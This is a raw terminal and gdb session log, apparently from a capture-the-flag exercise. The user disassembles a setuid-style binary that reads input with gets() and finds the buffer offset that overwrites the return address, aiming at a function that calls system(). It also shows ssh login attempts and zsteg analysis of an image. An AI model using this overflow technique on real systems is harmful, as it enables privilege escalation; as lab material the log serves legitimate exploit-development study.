void _wordcopy_fwd_dest_aligned(long, long, size_t);

File wordexp.c:
void __GI_wordfree(wordexp_t *);
int wordexp(const char *, wordexp_t *, int);
static int eval_expr(char *, long *);
static int eval_expr_multdiv(char **, long *);
static int eval_expr_val(char **, long *);
static int exec_comm(char *, char **, size_t *, size_t *, int, const char *, const char *, wordexp_t *);
static int parse_arith(char **, size_t *, size_t *, const char *, size_t *, int, int);
static int parse_backtick(char **, size_t *, size_t *, const char *, size_t *, int, const char *, const char *, wordexp_t *);
static int parse_dollars(char **, size_t *, size_t *, const char *, size_t *, int, wordexp_t *, const char *, const char *, int);
static int parse_qtd_backslash(char **, size_t *, size_t *, const char *, size_t *);
static int parse_tilde(char **, size_t *, size_t *, const char *, size_t *, size_t);
static char *w_addchar(char, size_t *, size_t *, char *);
static char *w_addmem(size_t, const char *, size_t *, size_t *, char *);
static char *w_addstr(const char *, size_t *, size_t *, char *);

File wprintf.c:
int __wprintf(const wchar_t *, ...);

File wprintf_chk.c:
---Type <return> to continue, or q <return> to quit---
int __wprintf_chk(int, const wchar_t *, ...);

File wscanf.c:
int __wscanf(const wchar_t *, ...);

File wstrops.c:
__ssize_t _IO_wstr_count(_IO_FILE *);
void _IO_wstr_finish(_IO_FILE *, int);
void _IO_wstr_init_static(_IO_FILE *, wchar_t *, size_t, wchar_t *);
wint_t _IO_wstr_overflow(_IO_FILE *, wint_t);
wint_t _IO_wstr_pbackfail(_IO_FILE *, wint_t);
__off64_t _IO_wstr_seekoff(_IO_FILE *, __off64_t, int, int);
wint_t _IO_wstr_underflow(_IO_FILE *);
static int enlarge_userbuf(_IO_FILE *, __off64_t, int);

File xcrypt.c:
void __GI_passwd2des_internal(char *, char *);
int __GI_xdecrypt(char *, char *);
int __GI_xencrypt(char *, char *);

File xdr.c:
bool_t __GI_xdr_bool(XDR *, bool_t *);
bool_t __GI_xdr_bytes(XDR *, char **, u_int *, u_int);
bool_t __GI_xdr_char(XDR *, char *);

bool_t __GI_xdr_enum(XDR *, enum_t *);
void __GI_xdr_free(xdrproc_t, char *);
bool_t __GI_xdr_hyper(XDR *, quad_t *);
bool_t __GI_xdr_long(XDR *, long *);
bool_t __GI_xdr_longlong_t(XDR *, quad_t *);
bool_t __GI_xdr_netobj(XDR *, struct netobj *);
bool_t __GI_xdr_opaque(XDR *, caddr_t, u_int);
bool_t __GI_xdr_short(XDR *, short *);
bool_t __GI_xdr_string(XDR *, char **, u_int);
bool_t __GI_xdr_u_char(XDR *, u_char *);

bool_t __GI_xdr_u_hyper(XDR *, u_quad_t *);
bool_t __GI_xdr_u_int(XDR *, u_int *);
bool_t __GI_xdr_u_long(XDR *, u_long *);
bool_t __GI_xdr_u_longlong_t(XDR *, u_quad_t *);
bool_t __GI_xdr_u_short(XDR *, u_short *);
bool_t __GI_xdr_union(XDR *, enum_t *, char *, const struct xdr_discrim *, xdrproc_t);
---Type <return> to continue, or q <return> to quit---
bool_t __GI_xdr_void(void);
bool_t __GI_xdr_wrapstring(XDR *, char **);

File xdr_array.c:
bool_t __GI_xdr_array(XDR *, caddr_t *, u_int *, u_int, u_int, xdrproc_t);
bool_t __GI_xdr_vector(XDR *, char *, u_int, u_int, xdrproc_t);

File xdr_float.c:
bool_t __GI_xdr_double(XDR *, double *);
bool_t __GI_xdr_float(XDR *, float *);

File xdr_intXX_t.c:
bool_t __GI_xdr_int16_t(XDR *, int16_t *);
bool_t __GI_xdr_int64_t(XDR *, int64_t *);
bool_t __GI_xdr_int8_t(XDR *, int8_t *);
bool_t __GI_xdr_quad_t(XDR *, quad_t *);
bool_t __GI_xdr_u_quad_t(XDR *, u_quad_t *);
bool_t __GI_xdr_uint16_t(XDR *, uint16_t *);
bool_t __GI_xdr_uint32_t(XDR *, uint32_t *);
bool_t __GI_xdr_uint64_t(XDR *, uint64_t *);
bool_t __GI_xdr_uint8_t(XDR *, uint8_t *);

File xdr_mem.c:
void __GI_xdrmem_create(XDR *, const caddr_t, u_int, enum xdr_op);
static void xdrmem_destroy(XDR *);
static bool_t xdrmem_getbytes(XDR *, caddr_t, u_int);
static bool_t xdrmem_getint32(XDR *, int32_t *);
static bool_t xdrmem_getlong(XDR *, long *);
static u_int xdrmem_getpos(const XDR *);
static int32_t *xdrmem_inline(XDR *, u_int);
static bool_t xdrmem_putbytes(XDR *, const char *, u_int);
static bool_t xdrmem_putint32(XDR *, const int32_t *);
static bool_t xdrmem_putlong(XDR *, const long *);
static bool_t xdrmem_setpos(XDR *, u_int);

File xdr_rec.c:
void __GI_xdrrec_create(XDR *, u_int, u_int, caddr_t, int (*)(char *, char *, int), int (*)(char *, char *, int));
bool_t __GI_xdrrec_endofrecord(XDR *, bool_t);
bool_t __GI_xdrrec_eof(XDR *);
bool_t __GI_xdrrec_skiprecord(XDR *);
---Type <return> to continue, or q <return> to quit---
static void xdrrec_destroy(XDR *);
static bool_t xdrrec_getbytes(XDR *, caddr_t, u_int);
static bool_t xdrrec_getint32(XDR *, int32_t *);
static bool_t xdrrec_getlong(XDR *, long *);
static u_int xdrrec_getpos(const XDR *);
static int32_t *xdrrec_inline(XDR *, u_int);
static bool_t xdrrec_putbytes(XDR *, const char *, u_int);
static bool_t xdrrec_putint32(XDR *, const int32_t *);
static bool_t xdrrec_putlong(XDR *, const long *);
static bool_t xdrrec_setpos(XDR *, u_int);

File xdr_ref.c:
bool_t __GI_xdr_pointer(XDR *, char **, u_int, xdrproc_t);
bool_t __GI_xdr_reference(XDR *, caddr_t *, u_int, xdrproc_t);

File xdr_sizeof.c:
unsigned long __GI_xdr_sizeof(xdrproc_t, void *);
static int harmless(void);

static void x_destroy(XDR *);
static u_int x_getpostn(const XDR *);
static int32_t *x_inline(XDR *, u_int);
static bool_t x_putbytes(XDR *, const char *, u_int);
static bool_t x_putint32(XDR *, const int32_t *);
static bool_t x_setpostn(XDR *, u_int);

File xdr_stdio.c:
void __GI_xdrstdio_create(XDR *, FILE *, enum xdr_op);

static void xdrstdio_destroy(XDR *);
static bool_t xdrstdio_getbytes(XDR *, const caddr_t, u_int);
static bool_t xdrstdio_getint32(XDR *, int32_t *);
static bool_t xdrstdio_getlong(XDR *, long *);
static u_int xdrstdio_getpos(const XDR *);
static int32_t *xdrstdio_inline(XDR *, u_int);
static bool_t xdrstdio_putbytes(XDR *, const char *, u_int);
static bool_t xdrstdio_putint32(XDR *, const int32_t *);
static bool_t xdrstdio_putlong(XDR *, const long *);
static bool_t xdrstdio_setpos(XDR *, u_int);

File xpg-strerror.c:
int __xpg_strerror_r(int, char *, size_t);
---Type <return> to continue, or q <return> to quit---

File xpg_basename.c:
char *__xpg_basename(char *);

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004e0  strlen@plt
0x00000000004004f0  system@plt
0x0000000000400500  geteuid@plt
0x0000000000400510  __libc_start_main@plt
0x0000000000400520  gets@plt
0x0000000000400530  setreuid@plt
0x0000000000400550  _start
0x0000000000400580  deregister_tm_clones
0x00000000004005c0  register_tm_clones
0x0000000000400600  __do_global_dtors_aux
0x0000000000400620  frame_dummy
0x0000000000400646  funcc
0x0000000000400657  ff
0x0000000000400680  main
0x00000000004006e0  __libc_csu_init
0x0000000000400750  __libc_csu_fini
0x0000000000400754  _fini
0x00007f87036f8a70  __libc_memalign@plt
0x00007f87036f8a80  malloc@plt
0x00007f87036f8a90  calloc@plt
0x00007f87036f8aa0  realloc@plt
0x00007fffd3faaa10  __vdso_clock_gettime
0x00007fffd3faaa10  clock_gettime
0x00007fffd3faac80  __vdso_gettimeofday
0x00007fffd3faac80  gettimeofday
0x00007fffd3faade0  __vdso_time
0x00007fffd3faade0  time
0x00007fffd3faae00  __vdso_getcpu

0x00007fffd3faae00  getcpu
0x00007f870334d7f0  realloc@plt
0x00007f870334d800  __tls_get_addr@plt
0x00007f870334d820  memalign@plt
0x00007f870334d850  _dl_find_dso_for_object@plt
0x00007f870334d870  calloc@plt
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) 
(gdb) disas frame_dummy
Dump of assembler code for function frame_dummy:
   0x0000000000400620 <+0>:	mov    $0x600e20,%edi
   0x0000000000400625 <+5>:	cmpq   $0x0,(%rdi)
   0x0000000000400629 <+9>:	jne    0x400630 <frame_dummy+16>
   0x000000000040062b <+11>:	jmp    0x4005c0 <register_tm_clones>
   0x000000000040062d <+13>:	nopl   (%rax)
   0x0000000000400630 <+16>:	mov    $0x0,%eax
   0x0000000000400635 <+21>:	test   %rax,%rax
   0x0000000000400638 <+24>:	je     0x40062b <frame_dummy+11>
   0x000000000040063a <+26>:	push   %rbp
   0x000000000040063b <+27>:	mov    %rsp,%rbp
   0x000000000040063e <+30>:	callq  *%rax
   0x0000000000400640 <+32>:	pop    %rbp
   0x0000000000400641 <+33>:	jmpq   0x4005c0 <register_tm_clones>
End of assembler dump.
(gdb) disas ff
Dump of assembler code for function ff:
   0x0000000000400657 <+0>:	push   %rbp
   0x0000000000400658 <+1>:	mov    %rsp,%rbp
   0x000000000040065b <+4>:	sub    $0x10,%rsp
   0x000000000040065f <+8>:	mov    %rdi,-0x8(%rbp)
   0x0000000000400663 <+12>:	mov    -0x8(%rbp),%rax
   0x0000000000400667 <+16>:	mov    %rax,%rdi
   0x000000000040066a <+19>:	callq  0x4004e0 <strlen@plt>
   0x000000000040066f <+24>:	lea    -0x1(%rax),%rdx
   0x0000000000400673 <+28>:	mov    -0x8(%rbp),%rax
   0x0000000000400677 <+32>:	add    %rdx,%rax
   0x000000000040067a <+35>:	movb   $0x0,(%rax)
   0x000000000040067d <+38>:	nop
   0x000000000040067e <+39>:	leaveq 
   0x000000000040067f <+40>:	retq   
End of assembler dump.
(gdb) disas funcc
Dump of assembler code for function funcc:
   0x0000000000400646 <+0>:	push   %rbp
   0x0000000000400647 <+1>:	mov    %rsp,%rbp
   0x000000000040064a <+4>:	mov    $0x400764,%edi
   0x000000000040064f <+9>:	callq  0x4004f0 <system@plt>
   0x0000000000400654 <+14>:	nop
   0x0000000000400655 <+15>:	pop    %rbp
   0x0000000000400656 <+16>:	retq   
End of assembler dump.
(gdb) run <<< $(python -c "print 'A'*152")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*152")

Program received signal SIGSEGV, Segmentation fault.
0x00007fdb7071f800 in __libc_start_main (main=0x400680 <main>, argc=1, argv=0x7fffa71e0448, init=<optimized out>, 
    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffa71e0438) at ../csu/libc-start.c:285
285	../csu/libc-start.c: No such file or directory.
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400680 <+0>:	push   %rbp
   0x0000000000400681 <+1>:	mov    %rsp,%rbp
   0x0000000000400684 <+4>:	push   %rbx
   0x0000000000400685 <+5>:	sub    $0x88,%rsp
   0x000000000040068c <+12>:	mov    $0x0,%eax
   0x0000000000400691 <+17>:	callq  0x400500 <geteuid@plt>
   0x0000000000400696 <+22>:	mov    %eax,%ebx
   0x0000000000400698 <+24>:	mov    $0x0,%eax
   0x000000000040069d <+29>:	callq  0x400500 <geteuid@plt>
   0x00000000004006a2 <+34>:	mov    %ebx,%esi
   0x00000000004006a4 <+36>:	mov    %eax,%edi
   0x00000000004006a6 <+38>:	mov    $0x0,%eax
   0x00000000004006ab <+43>:	callq  0x400530 <setreuid@plt>
   0x00000000004006b0 <+48>:	lea    -0x90(%rbp),%rax
   0x00000000004006b7 <+55>:	mov    %rax,%rdi
   0x00000000004006ba <+58>:	mov    $0x0,%eax
   0x00000000004006bf <+63>:	callq  0x400520 <gets@plt>
   0x00000000004006c4 <+68>:	mov    $0x0,%eax
   0x00000000004006c9 <+73>:	add    $0x88,%rsp
   0x00000000004006d0 <+80>:	pop    %rbx
   0x00000000004006d1 <+81>:	pop    %rbp
   0x00000000004006d2 <+82>:	retq   
End of assembler dump.
(gdb) break *0x00000000004006bf 
Breakpoint 1 at 0x4006bf
(gdb) break *0x00000000004006c4
Breakpoint 2 at 0x4006c4
(gdb) run <<< $(python -c "print 'A'*152")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*152")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) i r
rax            0x0	0
rbx            0x3fe	1022
rcx            0x7fbbd6dcd1a5	140444740407717
rdx            0x7fffcbf26e68	140736615050856
rsi            0x3fe	1022
rdi            0x7fffcbf26ce0	140736615050464
rbp            0x7fffcbf26d70	0x7fffcbf26d70
rsp            0x7fffcbf26ce0	0x7fffcbf26ce0
r8             0x400750	4196176
r9             0x7fbbd70aaab0	140444743412400
r10            0x1c0	448
r11            0x246	582
r12            0x400550	4195664
r13            0x7fffcbf26e50	140736615050832
r14            0x0	0
r15            0x0	0
rip            0x4006bf	0x4006bf <main+63>
eflags         0x207	[ CF PF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) i r
rax            0x7fffcbf26ce0	140736615050464
rbx            0x3fe	1022
rcx            0x7fbbd70948e0	140444743321824
rdx            0x7fbbd7096790	140444743329680
rsi            0x18160a8	25256104
rdi            0x7fffcbf26d78	140736615050616
rbp            0x7fffcbf26d70	0x7fffcbf26d70
rsp            0x7fffcbf26ce0	0x7fffcbf26ce0
r8             0x18160a9	25256105
r9             0x4141414141414141	4702111234474983745
r10            0x4141414141414141	4702111234474983745
r11            0x246	582
r12            0x400550	4195664
r13            0x7fffcbf26e50	140736615050832
r14            0x0	0
r15            0x0	0
rip            0x4006c4	0x4006c4 <main+68>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) cc
Undefined command: "cc".  Try "help".
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fbbd6cf0800 in __libc_start_main (main=0x400680 <main>, argc=1, argv=0x7fffcbf26e58, init=<optimized out>, 
    fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffcbf26e48) at ../csu/libc-start.c:285
285	../csu/libc-start.c: No such file or directory.
(gdb) run <<< $(python -c "print 'A'*151")
The program being debugged has been started already.
Start it from the beginning? (y or n) 
Please answer y or n.
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151")
c
Breakpoint 1, 0x00000000004006bf in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) c
Continuing.
[Inferior 1 (process 856) exited normally]
(gdb) run <<< $(python -c "print 'A'*151+'BBBBwq'")
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151+'BBBBwq'")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) run <<< $(python -c "print 'A'*151+'BBBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151+'BBBB'")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) i r
rax            0x0	0
rbx            0x3fe	1022
rcx            0x7f95672d61a5	140279657882021
rdx            0x7fffd0693b78	140736689945464
rsi            0x3fe	1022
rdi            0x7fffd06939f0	140736689945072
rbp            0x7fffd0693a80	0x7fffd0693a80
rsp            0x7fffd06939f0	0x7fffd06939f0
r8             0x400750	4196176
r9             0x7f95675b3ab0	140279660886704
r10            0x1c0	448
r11            0x246	582
r12            0x400550	4195664
r13            0x7fffd0693b60	140736689945440
r14            0x0	0
r15            0x0	0
rip            0x4006bf	0x4006bf <main+63>
eflags         0x207	[ CF PF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) i r
rax            0x7fffd06939f0	140736689945072
rbx            0x3fe	1022
rcx            0x7f956759d8e0	140279660796128
rdx            0x7f956759f790	140279660803984
rsi            0x12e00ab	19792043
rdi            0x7fffd0693a8b	140736689945227
rbp            0x7fffd0693a80	0x7fffd0693a80
rsp            0x7fffd06939f0	0x7fffd06939f0
r8             0x12e00ac	19792044
r9             0x4141414141414141	4702111234474983745
r10            0x4141414141414141	4702111234474983745
r11            0x246	582
r12            0x400550	4195664
r13            0x7fffd0693b60	140736689945440
r14            0x0	0
r15            0x0	0
rip            0x4006c4	0x4006c4 <main+68>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f9500424242 in ?? ()
(gdb) run <<< $(python -c "print 'A'*151+'BBBBBBBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151+'BBBBBBBB'")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006d2 in main ()
(gdb) run <<< $(python -c "print 'A'*151+'BBBBBBBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151+'BBBBBBBB'")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) i r
rax            0x7ffc059449d0	140720402090448
rbx            0x3fe	1022
rcx            0x7f63b424d8e0	140066200803552
rdx            0x7f63b424f790	140066200811408
rsi            0xaf80af	11501743
rdi            0x7ffc05944a6f	140720402090607
rbp            0x7ffc05944a60	0x7ffc05944a60
rsp            0x7ffc059449d0	0x7ffc059449d0
r8             0xaf80b0	11501744
r9             0x4141414141414141	4702111234474983745
r10            0x4141414141414141	4702111234474983745
r11            0x246	582
r12            0x400550	4195664
r13            0x7ffc05944b40	140720402090816
r14            0x0	0
r15            0x0	0
rip            0x4006c4	0x4006c4 <main+68>
eflags         0x246	[ PF ZF IF ]
cs             0x33	51
ss             0x2b	43
ds             0x0	0
es             0x0	0
fs             0x0	0
gs             0x0	0
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00000000004006d2 in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400680 <+0>:	push   %rbp
   0x0000000000400681 <+1>:	mov    %rsp,%rbp
   0x0000000000400684 <+4>:	push   %rbx
   0x0000000000400685 <+5>:	sub    $0x88,%rsp
   0x000000000040068c <+12>:	mov    $0x0,%eax
   0x0000000000400691 <+17>:	callq  0x400500 <geteuid@plt>
   0x0000000000400696 <+22>:	mov    %eax,%ebx
   0x0000000000400698 <+24>:	mov    $0x0,%eax
   0x000000000040069d <+29>:	callq  0x400500 <geteuid@plt>
   0x00000000004006a2 <+34>:	mov    %ebx,%esi
   0x00000000004006a4 <+36>:	mov    %eax,%edi
   0x00000000004006a6 <+38>:	mov    $0x0,%eax
   0x00000000004006ab <+43>:	callq  0x400530 <setreuid@plt>
   0x00000000004006b0 <+48>:	lea    -0x90(%rbp),%rax
   0x00000000004006b7 <+55>:	mov    %rax,%rdi
   0x00000000004006ba <+58>:	mov    $0x0,%eax
   0x00000000004006bf <+63>:	callq  0x400520 <gets@plt>
   0x00000000004006c4 <+68>:	mov    $0x0,%eax
   0x00000000004006c9 <+73>:	add    $0x88,%rsp
   0x00000000004006d0 <+80>:	pop    %rbx
   0x00000000004006d1 <+81>:	pop    %rbp
=> 0x00000000004006d2 <+82>:	retq   
End of assembler dump.
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) run <<< $(python -c "print 'A'*151+'BBBBBBB'")
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151+'BBBBBBB'")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
(gdb) run <<< $(python -c "print 'A'*151+'BBBBBBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151+'BBBBBBB'")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
(gdb) disas func
No symbol "func" in current context.
(gdb) disas funcc
Dump of assembler code for function funcc:
   0x0000000000400646 <+0>:	push   %rbp
   0x0000000000400647 <+1>:	mov    %rsp,%rbp
   0x000000000040064a <+4>:	mov    $0x400764,%edi
   0x000000000040064f <+9>:	callq  0x4004f0 <system@plt>
   0x0000000000400654 <+14>:	nop
   0x0000000000400655 <+15>:	pop    %rbp
   0x0000000000400656 <+16>:	retq   
End of assembler dump.
(gdb) run <<< $(python -c "print 'A'*151+'BBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151+'BBB'")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007f8856004242 in ?? ()
(gdb) run <<< $(python -c "print 'A'*151+'BBBB'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/basic/basic <<< $(python -c "print 'A'*151+'BBBB'")

Breakpoint 1, 0x00000000004006bf in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x00000000004006c4 in main ()
(gdb) packet_write_wait: Connection to 51.254.114.246 port 22: Broken pipe
root@kali:~/Downloads# 
root@kali:~/Downloads# ssh basic@51.254.114.246 
load pubkey "/root/.ssh/id_rsa": invalid format
basic@51.254.114.246's password: 
Connection closed by 51.254.114.246 port 22
root@kali:~/Downloads# 
root@kali:~/Downloads# 
root@kali:~/Downloads# ssh basic@51.254.114.246 
load pubkey "/root/.ssh/id_rsa": invalid format
basic@51.254.114.246's password: 
Permission denied, please try again.
basic@51.254.114.246's password: 
Permission denied, please try again.
basic@51.254.114.246's password: 
Connection closed by 51.254.114.246 port 22
root@kali:~/Downloads# 
root@kali:~/Downloads# 
root@kali:~/Downloads# 
root@kali:~/Downloads# zsteg pic.png 
b1,rgb,lsb,xy       .. text: "--START--\n\"The fact is that upon his entrance I had instantly recognized the extreme\npersonal danger in which I lay. The only conceivable escape for him lay in silencing\nmy tongue. In an instant I had slipped the revolver from the drawer into my\npocket and"
b2,b,msb,xy         .. text: "_uW}W}W}"
b3,b,lsb,xy         .. file: very old 16-bit-int big-endian archive
b4,r,lsb,xy         .. text: "\nvvwgffwfwvwgg"
b4,g,lsb,xy         .. text: "gwvwvffwvgvfggfvwgvfvgfgvgffvwfvwgfvfgvvwwvfwgfwfgvgvgffwgffffffwgfffgfgvwvfwgvfwwfwvwfgvwvfwgvffgvfvwffwgvwvwvfggffvgfgwgfffgvfwgvfvgffwgfwwgfgwgfffgvfwwvfvgfffgvgwgffvwvgvwvfvgfgwgvfvwfgvwfffgvgvgffwwvfwgfvfgfgfgffwgvgvwfgvvffwwfvwwvgvwvgfffgfgfgfgfgvwvf"
b4,b,lsb,xy         .. text: "wfgggfgfgffwffwfvfffwfggwfgwvfgfvfgfvggfwfvfvfggvfgvwgwgwfwgvfffvfgfvfgvvgggwggvvfgfwfwwwfwwvfgfvggvwfggvggfwfggfgggvgwwwfgvvfggwfwgvfgwwfggvfggvfgwvfggvfvfgfggvfwvwgffvfwvvfgwwfgfwfffwgwgvgggvfwwvfgvvfffwfgwvfgvvgwwwfgvvfgvwfwwvfgfwfwgwffvvfgvvfgvvfgvvggg"
b4,rgb,lsb,xy       .. text: "ogWef&vfFmw"
b4,rgb,msb,xy       .. text: "`vnovng>"
b4,bgr,lsb,xy       .. text: "ogVev&ffG}g"
root@kali:~/Downloads# 

